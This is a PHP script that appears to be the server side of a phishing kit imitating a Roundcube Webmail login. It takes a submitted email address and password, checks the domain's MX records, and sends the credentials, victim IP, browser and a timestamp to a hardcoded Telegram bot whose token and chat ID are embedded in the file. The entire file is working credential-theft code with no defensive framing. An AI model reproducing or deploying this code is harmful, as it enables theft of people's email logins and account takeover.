<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

define('BOT_TOKEN', '5930167808:AAHCFIyEMMqBSayPhtOItRSpfFKHmZaTbsg');
define('CHAT_ID', '1405869269');

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Invalid request method']);
    exit;
}

$email = sanitize_input($_POST['aa'] ?? '');
$pass = trim($_POST['bb'] ?? '');


if (empty($email)) {
    http_response_code(400);
    echo json_encode(['error' => 'Email required']);
    exit;
}

if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid email format']);
    exit;
}

$domain = substr(strrchr($email, "@"), 1);
if (!checkdnsrr($domain, 'MX')) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid email domain (no MX record)']);
    exit;
}

// Get MX records
$mxhosts = [];
$mxweights = [];
getmxrr($domain, $mxhosts, $mxweights);

// Format MX records
$mx_records = [];
for ($i = 0; $i < count($mxhosts); $i++) {
    $mx_records[] = $mxhosts[$i] . ' (priority: ' . $mxweights[$i] . ')';
}
$mx_string = implode(', ', $mx_records);

$ip = get_client_ip();
$browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

$message  = "🔐 <b>Login Attempt-Roundcube Webmail</b>\n\n";
$message .= "📧 <b>Email/username:</b> {$email}\n";
$message .= "🔒 <b>Password:</b> {$pass}\n";
$message .= "🌐 <b>IP:</b> {$ip}\n";
$message .= "🖥 <b>Browser:</b> {$browser}\n";
$message .= "📬 <b>MX Records:</b> {$mx_string}\n";
$message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s');

$result = send_to_telegram($message);

if ($result) {
    echo json_encode(['success' => true, 'mx_records' => $mx_records]);
} else {
    echo json_encode(['error' => 'Telegram send failed']);
}

function sanitize_input($data) {
    return htmlspecialchars(trim($data));
}

function get_client_ip() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function send_to_telegram($message) {

    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";

    $data = [
        'chat_id' => CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    $result = curl_exec($ch);
    curl_close($ch);

    return $result !== false;
}
?>